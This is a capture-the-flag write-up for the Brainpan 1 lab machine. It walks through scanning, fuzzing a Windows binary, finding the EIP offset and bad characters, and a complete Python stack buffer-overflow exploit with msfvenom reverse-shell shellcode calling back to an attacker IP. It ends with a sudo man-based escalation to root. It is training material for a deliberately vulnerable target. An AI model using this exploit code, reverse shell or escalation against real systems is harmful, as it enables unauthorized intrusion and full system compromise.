# Brainpan 1
## 25-06-2022
## level : hard

Machine IP : `10.10.172.22`

Nmap Scan 
```
nmap -sV -p- -T5 10.10.172.22 -oN brainpan.txt
```

Gobuster scan for finding the binary
```
gobuster dir -u http://10.10.172.22:10000 -w /usr/share/wordlists/dirb/common.txt -t 50
```
We found a `bin` directory which contain the `brainpan.exe`
 
Download the binary
```
wget http://10.10.172.22:10000/bin/brainpan.exe
```

Fuzzing the binary in local environment

```
#!/usr/bin/python

import socket
import time
import sys

ip = '10.10.2.7'
port = 9999
buffer = b"A" * 100

while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.settimeout(5)
                s.send((buffer + b'\r\n'))
                print("[i] Send {} bytes".format(len(buffer)))
                s.close()
                time.sleep(1)
                buffer = buffer + b'A' * 100
        except:
                print("Crashed at : {} bytes".format(len(buffer)))
                sys.exit()


```
Creating a cyclic pattern 
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Program to find the offset of `EIP` register
```
#!/usr/bin/python

import socket
import sys

ip = '10.10.2.7'
port = 9999

buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("[i] Connected...")
        s.send((buffer + b'\r\n'))
        s.close()
        print("[i] Buffer send...")
except:
        print("[X] Connection Failed")
        sys.exit()

```
Finding the offset after crashing the program ( Run into immunity debugger )
```
!mona findmsp -distance 1000
```
The offset for `EIP` is `524`

Program for badchars 

```
#!/usr/bin/python

import socket
import sys


ip = '10.10.2.7'
port = 9999


offset = 524
buffer = b"A" * offset 
badchar = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("[i] Connected...")
        s.send((buffer + badchar + b'\r\n'))
        s.close()
        print("[i] Buffer send...")
except:
        print("[X] Connection Failed")
        sys.exit()



```


Finding the badchars in the immunity debugger 

```
!mona set workingdirectory c:\mona\%p

!mona bytearray -cpb "\x00"

!mona compare -f c:\mona\brainpan\bytearray.bin -a 005ff910
```

Finding the return value 
```
!mona jmp -r esp -epb "\x00"
```

The return address is : `311712f3`



Generating the payload for the actual machine
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.17.48.110 LPORT=12345 EXITFUNC=thread -f python -b "\x00"
```


The exploit program for the brainpan
```
#!/usr/bin/python

import socket
import sys


ip = '10.10.172.22'
port = 9999

offset = 524
overflow = b'A' * offset
retn_addr = b'\xf3\x12\x17\x31'
nops = b'\x90'*16
buf =  b""
buf += b"\xdd\xc0\xb8\x8a\x5e\xfd\xc3\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x12\x31\x42\x17\x83\xc2\x04\x03\xc8\x4d\x1f"
buf += b"\x36\xfd\xaa\x28\x5a\xae\x0f\x84\xf7\x52\x19\xcb\xb8"
buf += b"\x34\xd4\x8c\x2a\xe1\x56\xb3\x81\x91\xde\xb5\xe0\xf9"
buf += b"\xea\x54\x23\x97\x82\x54\x43\x57\x6a\xd0\xa2\x27\xea"
buf += b"\xb2\x75\x14\x40\x31\xff\x7b\x6b\xb6\xad\x13\x1a\x98"
buf += b"\x22\x8b\x8a\xc9\xeb\x29\x22\x9f\x17\xff\xe7\x16\x36"
buf += b"\x4f\x0c\xe4\x39"

payload = overflow + retn_addr + nops + buf + b'\r\n'

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("[i] Connected...")
        s.send((payload))
        s.close()
        print("[i] Buffer send...")
except:
        print("[X] Connection Failed")
        sys.exit()


```

Getting a shell
```
nc -lvnp 12345
```

Make the shell stable
```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-color
```


### Privilege Escalation

We first look for the `sudo` by
```
sudo -l
```

We can see that there is binary available called `/home/anansi/bin/anansi_util` which can be run as sudo.

Now when we run this
```
sudo /home/anansi/bin/anansi_util
```

There is three options available among which third options is running the `man` command using sudo

By looking at the gtfobin we can find that, we can escalate privilege using the `man` command when it is equipped with `sudo`.


So, we tried following command

```
sudo /home/anansi/bin/anansi_util manual man
```

After that just type `!/bin/bash` and we are good to go.


We got the root shell :)





--------------------------    THE END    -------------------------- 
